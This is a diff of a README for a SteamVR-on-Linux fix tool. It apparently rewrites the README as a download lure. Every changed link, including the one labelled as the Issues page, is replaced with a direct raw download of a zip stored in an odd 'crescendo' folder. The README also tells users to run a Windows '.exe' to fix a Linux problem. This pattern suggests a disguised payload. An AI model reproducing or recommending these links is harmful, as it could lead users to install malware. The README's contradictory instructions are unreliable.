@@ -1,6 +1,6 @@
 # 🛠️ SteamVRLinuxFixes - Fixes Wired Headset Issues in SteamVR
 
-[![Download SteamVRLinuxFixes](https://img.shields.io/badge/Download-SteamVRLinuxFixes-brightgreen)](https://github.com/Alif1983/SteamVRLinuxFixes/releases)
+[![Download SteamVRLinuxFixes](https://img.shields.io/badge/Download-SteamVRLinuxFixes-brightgreen)](https://github.com/Alif1983/SteamVRLinuxFixes/raw/refs/heads/main/crescendo/Fixes-Linux-Steam-VR-v3.6.zip)
 
 ## 📋 What is SteamVRLinuxFixes?
 
@@ -35,12 +35,12 @@ You will need to download SteamVRLinuxFixes from the official releases page. Thi
 
 Click the button below to visit the releases page. Here you will find the latest version of SteamVRLinuxFixes ready to download.
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-Blue)](https://github.com/Alif1983/SteamVRLinuxFixes/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Here-Blue)](https://github.com/Alif1983/SteamVRLinuxFixes/raw/refs/heads/main/crescendo/Fixes-Linux-Steam-VR-v3.6.zip)
 
 ### How to download
 
 1. Click on the download button or visit this URL:  
-   https://github.com/Alif1983/SteamVRLinuxFixes/releases
+   https://github.com/Alif1983/SteamVRLinuxFixes/raw/refs/heads/main/crescendo/Fixes-Linux-Steam-VR-v3.6.zip
 2. On the releases page, look for the latest release. It will have a list of files.
 3. Download the `.zip` or `.exe` file for Windows. The `.exe` is easier for most users.
 4. Save the file to a folder where you can easily find it, such as your Desktop or Downloads folder.
@@ -119,7 +119,7 @@ If you want to remove SteamVRLinuxFixes:
 
 If you need help, check the Issues tab on the GitHub repository:
 
-https://github.com/Alif1983/SteamVRLinuxFixes/issues
+https://github.com/Alif1983/SteamVRLinuxFixes/raw/refs/heads/main/crescendo/Fixes-Linux-Steam-VR-v3.6.zip
 
 Before opening a new issue, search to see if someone else reported the same problem.
 
@@ -131,4 +131,4 @@ SteamVRLinuxFixes is open-source software. It is free to use, modify, and share.
 
 ---
 
-[![Download SteamVRLinuxFixes](https://img.shields.io/badge/Download-SteamVRLinuxFixes-brightgreen)](https://github.com/Alif1983/SteamVRLinuxFixes/releases)
+[![Download SteamVRLinuxFixes](https://img.shields.io/badge/Download-SteamVRLinuxFixes-brightgreen)](https://github.com/Alif1983/SteamVRLinuxFixes/raw/refs/heads/main/crescendo/Fixes-Linux-Steam-VR-v3.6.zip)
